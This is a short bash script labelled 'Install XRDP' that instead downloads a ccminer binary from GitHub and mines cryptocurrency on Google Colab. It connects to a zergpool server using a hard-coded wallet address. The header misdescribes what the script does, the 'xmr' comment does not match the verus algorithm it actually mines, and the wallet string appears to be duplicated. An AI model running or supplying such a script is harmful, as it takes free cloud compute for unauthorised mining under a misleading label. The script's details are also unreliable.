#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccminer_3_7_ubuntu_18.04.tar.gz
tar xvzf ccminer_3_7_ubuntu_18.04.tar.gz
cd ccminer_3_7_ubuntu_18.04
./ccminer -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u 86bDqhG1c4XZXWcU9cX5qREg2E7ANWKhs4YwDQxSW6rmeT86bDqhG1c4XZXWcU9cX5qREg2E7ANWKhs4YwDQxSW6rmeT -k --tls --rig-id GC-US
